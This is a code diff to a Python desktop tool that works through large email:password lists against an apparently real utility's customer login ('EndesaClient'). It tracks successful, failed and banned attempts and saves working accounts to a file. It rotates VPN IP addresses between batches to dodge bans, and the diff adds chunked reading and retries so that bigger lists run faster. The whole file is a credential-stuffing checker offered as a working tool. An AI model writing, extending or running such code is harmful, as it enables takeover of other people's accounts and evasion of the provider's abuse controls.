@@ -10,8 +10,10 @@ from typing import Optional, List, Tuple, Dict
 from PyQt6.QtCore import QThread, pyqtSignal
 
 from src.core.endesa import EndesaClient
+from src.core.credentials_reader import CredentialsReader
 from src.network.vpn_manager import VPNManager
 from src.network.proxy_manager import ProxyManager
+from src.core.retry_manager import SimpleRetryProcessor, VPNRetryQueue
 
 
 class UILogHandler(logging.Handler):
@@ -84,26 +86,16 @@ class BatchProcessorThread(QThread):
                 self.status_updated.emit("Credentials file not found")
                 return
             
-            # Read all credentials from the file
-            with open(self.credentials_file, 'r', encoding='utf-8') as f:
-                lines = f.readlines()
+            # Create credentials reader for memory-efficient processing
+            credentials_reader = CredentialsReader(self.credentials_file, chunk_size=1000)
             
-            # Parse credentials (email:password format)
-            credentials = []
-            for line_num, line in enumerate(lines, 1):
-                line = line.strip()
-                if line and ':' in line:
-                    email, password = line.split(':', 1)
-                    credentials.append((email.strip(), password.strip(), line_num))
-                elif line:  # Line exists but no colon - skip this line
-                    self.progress_updated.emit(f"SKIP: Line {line_num} - Invalid format (missing ':')")
-                    continue
+            # Get total count for progress tracking
+            total_credentials = credentials_reader.get_total_count()
             
-            if not credentials:
+            if total_credentials == 0:
                 self.status_updated.emit("No valid credentials found in file")
                 return
             
-            total_credentials = len(credentials)
             self.status_updated.emit(f"Processing {total_credentials} credentials with {self.max_workers} workers...")
             
             self.start_time = time.time()
@@ -120,11 +112,11 @@ class BatchProcessorThread(QThread):
                     self.progress_updated.emit(f"VPN initialization failed: {e}")
                     self.use_vpn = False
             
-            # Process credentials based on mode
+            # Process credentials based on mode using chunked processing
             if self.use_vpn:
-                successful, failed, banned = self._process_vpn_mode(credentials, total_credentials)
+                successful, failed, banned = self._process_vpn_mode_chunked(credentials_reader, total_credentials)
             else:
-                successful, failed, banned = self._process_normal_mode(credentials, total_credentials)
+                successful, failed, banned = self._process_normal_mode_chunked(credentials_reader, total_credentials)
             
             # Disconnect VPN if enabled
             if self.use_vpn and self.vpn_manager:
@@ -145,131 +137,178 @@ class BatchProcessorThread(QThread):
             if hasattr(self, 'log_handler'):
                 logging.getLogger().removeHandler(self.log_handler)
     
-    def _process_normal_mode(self, credentials: List[Tuple[str, str, int]], total_credentials: int) -> Tuple[int, int, int]:
-        """Process credentials in normal mode without retry."""
+    def _process_normal_mode_chunked(self, credentials_reader: CredentialsReader, total_credentials: int) -> Tuple[int, int, int]:
+        """Process credentials in normal mode using chunked processing for memory efficiency."""
         self.progress_updated.emit("Starting normal mode processing...")
         
         successful = 0
         failed = 0
         banned = 0
+        retry_processor = SimpleRetryProcessor(self._attempt_credential,max_retries=self.max_retries,retry_delay=self.retry_delay,progress_callback=self.progress_updated.emit)
         
+        # Chunked normal mode processing
         with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
-            # Submit all tasks
-            future_to_credential = {}
-            for email, password, line_num in credentials:
+            for chunk in credentials_reader.read_chunks():
                 if not self.running:
                     break
                 
-                future = executor.submit(self._attempt_credential, email, password, line_num)
-                future_to_credential[future] = (email, line_num)
-            
-            # Use as_completed to properly wait for ALL threads to finish
-            from concurrent.futures import as_completed
-            
-            for future in as_completed(future_to_credential.keys()):
-                if not self.running:
-                    break
+                # Filter out invalid lines and emit SKIP messages for them
+                valid_credentials = []
+                for email, password, line_num in chunk:
+                    if email == "INVALID_LINE":
+                        # password contains the invalid line content, line_num is correct
+                        self.progress_updated.emit(f"SKIP: Line {line_num} - Invalid format (missing ':')")
+                        continue
+                    valid_credentials.append((email, password, line_num))
                 
-                try:
-                    result, result_type = future.result(timeout=30)  # 30 second timeout per thread
-                    email, line_num = future_to_credential[future]
+                if not valid_credentials:
+                    continue
+                
+                future_to_meta = {}
+                for email, password, line_num in valid_credentials:
+                    if not self.running:
+                        break
+                    future = executor.submit(retry_processor.process_with_retry, email, password, line_num)
+                    future_to_meta[future] = (email, password, line_num)
+                # Use as_completed to properly wait for ALL threads to finish
+                from concurrent.futures import as_completed
+                
+                for future in as_completed(future_to_meta.keys()):
+                    if not self.running:
+                        # Stop processing if the thread is stopped
+                        for fut in future_to_meta:
+                            fut.cancel()
+                        break
+                    email, password, line_num = future_to_meta[future]
                     
-                    # Write successful results to file
-                    if result.startswith("SUCCESS:") or result.startswith("NO_DATA:"):
-                        self._write_result_to_file(result)
-                    
-                    # Emit the result message
-                    self.progress_updated.emit(result)
-                    
-                    # Update statistics
-                    if result_type == "SUCCESS":
-                        successful += 1
-                    elif result_type == "BANNED":
-                        banned += 1
-                    elif result_type == "NO_DATA":
-                        successful += 1
-                    else:  # FAILED
+                    try:
+                        result, result_type = future.result(timeout=30)  # 30 second timeout per thread
+
+                        
+                        # Write successful results to file
+                        if result.startswith("SUCCESS:") or result.startswith("NO_DATA:"):
+                            self._write_result_to_file(result)
+                        
+                        # Emit the result message
+                        self.progress_updated.emit(result)
+                        
+                        # Update statistics
+                        if result_type == "SUCCESS":
+                            successful += 1
+                        elif result_type == "BANNED":
+                            banned += 1
+                        elif result_type == "NO_DATA":
+                            successful += 1
+                        else:  # FAILED
+                            failed += 1
+                        
+                    except TimeoutError:
+                        future.cancel()
                         failed += 1
-                    
-                    # Update progress
-                    current_total = successful + failed + banned
-                    progress_percent = int((current_total / total_credentials) * 100)
+                        self.progress_updated.emit(
+                            f"ERROR: Line {line_num} - {email} - Timeout (>30 s)"
+                        )
+
+                    except Exception as exc:
+                        failed += 1
+                        self._write_result_to_file(
+                            f"ERROR: Line {line_num} - {email} - {exc}"
+                        )
+                        self.progress_updated.emit(
+                            f"ERROR: Line {line_num} - {email} - {exc}"
+                        )
+
+                    processed_total = successful + failed + banned
+                    progress_percent = int((processed_total / total_credentials) * 100)
                     self.progress_percentage.emit(progress_percent)
-                    elapsed_time = time.time() - self.start_time
-                    rate = current_total / elapsed_time if elapsed_time > 0 else 0
-                    self.stats_updated.emit(successful, failed, banned, current_total, rate)
-                    self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
-                    
-                except Exception as e:
-                    email, line_num = future_to_credential[future]
-                    result = f"ERROR: Line {line_num} - {email} - {str(e)}"
-                    self._write_result_to_file(result)
-                    self.progress_updated.emit(result)
-                    
-                    failed += 1
-                    current_total = successful + failed + banned
-                    progress_percent = int((current_total / total_credentials) * 100)
-                    self.progress_percentage.emit(progress_percent)
-                    elapsed_time = time.time() - self.start_time
-                    rate = current_total / elapsed_time if elapsed_time > 0 else 0
-                    self.stats_updated.emit(successful, failed, banned, current_total, rate)
-                    self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
-        
+
+                    elapsed = time.time() - self.start_time
+                    rate = processed_total / elapsed if elapsed else 0
+                    self.stats_updated.emit(
+                        successful, failed, banned, processed_total, rate
+                    )
+                    self.status_updated.emit(
+                        f"Processed: {processed_total}/{total_credentials} ({progress_percent}%)"
+                    )
+
+                if not self.running:
+                    break  # Si hemos cancelado, salimos del bucle de chunks
+
         return successful, failed, banned
     
-    def _process_vpn_mode(self, credentials: List[Tuple[str, str, int]], total_credentials: int) -> Tuple[int, int, int]:
-        """Process credentials in VPN mode without retry."""
+
+    def _process_vpn_mode_chunked(self, credentials_reader: CredentialsReader, total_credentials: int) -> Tuple[int, int, int]:
+        """Process credentials in VPN mode using chunked processing for memory efficiency."""
         self.progress_updated.emit("Starting VPN mode processing...")
         
         successful = 0
         failed = 0
         banned = 0
-        
-        remaining_credentials = credentials.copy()
         batch_count = 0
         
-        while remaining_credentials and self.running:
-            # Prepare current batch
-            batch_size = min(self.max_workers, len(remaining_credentials))
-            current_batch = remaining_credentials[:batch_size]
-            remaining_credentials = remaining_credentials[batch_size:]
+        # Process each chunk from the reader
+        for chunk in credentials_reader.read_chunks():
+            if not self.running:
+                break
             
-            batch_count += 1
-            self.progress_updated.emit(f"Processing batch {batch_count} ({len(current_batch)} credentials)...")
+            # Filter out invalid lines and emit SKIP messages for them
+            valid_credentials = []
+            for email, password, line_num in chunk:
+                if email == "INVALID_LINE":
+                    # password contains the invalid line content, line_num is correct
+                    self.progress_updated.emit(f"SKIP: Line {line_num} - Invalid format (missing ':')")
+                    continue
+                valid_credentials.append((email, password, line_num))
             
-            # Handle VPN connection/rotation
-            if batch_count == 1:
-                self.progress_updated.emit("🔗 Connecting to VPN with proper verification...")
-                if self.vpn_manager.connect_with_proper_verification():
-                    self.progress_updated.emit("✅ VPN connected and verified!")
+            if not valid_credentials:
+                continue
+            
+            # Process this chunk in VPN batches (same as original VPN logic)
+            remaining_credentials = valid_credentials.copy()
+            
+            while remaining_credentials and self.running:
+                # Prepare current batch
+                batch_size = min(self.max_workers, len(remaining_credentials))
+                current_batch = remaining_credentials[:batch_size]
+                remaining_credentials = remaining_credentials[batch_size:]
+                
+                batch_count += 1
+                self.progress_updated.emit(f"Processing batch {batch_count} ({len(current_batch)} credentials)...")
+                
+                # Handle VPN connection/rotation
+                if batch_count == 1:
+                    self.progress_updated.emit("🔗 Connecting to VPN with proper verification...")
+                    if self.vpn_manager.connect_with_proper_verification():
+                        self.progress_updated.emit("✅ VPN connected and verified!")
+                    else:
+                        self.progress_updated.emit("❌ VPN connection failed, continuing without VPN")
+                        self.use_vpn = False
                 else:
-                    self.progress_updated.emit("❌ VPN connection failed, continuing without VPN")
-                    self.use_vpn = False
-            else:
-                self.progress_updated.emit("🔄 Rotating IP for next batch...")
-                if self.vpn_manager.rotate_ip():
-                    self.progress_updated.emit("✅ IP rotated successfully")
-                else:
-                    self.progress_updated.emit("⚠️ IP rotation failed, continuing with current IP")
-            
-            # Process current batch
-            batch_successful, batch_failed, batch_banned = self._process_batch_vpn(current_batch)
-            
-            # Update totals
-            successful += batch_successful
-            failed += batch_failed
-            banned += batch_banned
-            
-            # Update progress
-            current_total = successful + failed + banned
-            progress_percent = int((current_total / total_credentials) * 100)
-            self.progress_percentage.emit(progress_percent)
-            elapsed_time = time.time() - self.start_time
-            rate = current_total / elapsed_time if elapsed_time > 0 else 0
-            self.stats_updated.emit(successful, failed, banned, current_total, rate)
-            self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
+                    self.progress_updated.emit("🔄 Rotating IP for next batch...")
+                    if self.vpn_manager.rotate_ip():
+                        self.progress_updated.emit("✅ IP rotated successfully")
+                    else:
+                        self.progress_updated.emit("⚠️ IP rotation failed, continuing with current IP")
+                
+                # Process current batch
+                batch_successful, batch_failed, batch_banned = self._process_batch_vpn(current_batch)
+                
+                # Update totals
+                successful += batch_successful
+                failed += batch_failed
+                banned += batch_banned
+                
+                # Update progress
+                current_total = successful + failed + banned
+                progress_percent = int((current_total / total_credentials) * 100)
+                self.progress_percentage.emit(progress_percent)
+                elapsed_time = time.time() - self.start_time
+                rate = current_total / elapsed_time if elapsed_time > 0 else 0
+                self.stats_updated.emit(successful, failed, banned, current_total, rate)
+                self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
         
         return successful, failed, banned
+
     
     def _process_batch_vpn(self, batch_credentials: List[Tuple[str, str, int]]) -> Tuple[int, int, int]:
         """Process a batch of credentials in VPN mode."""
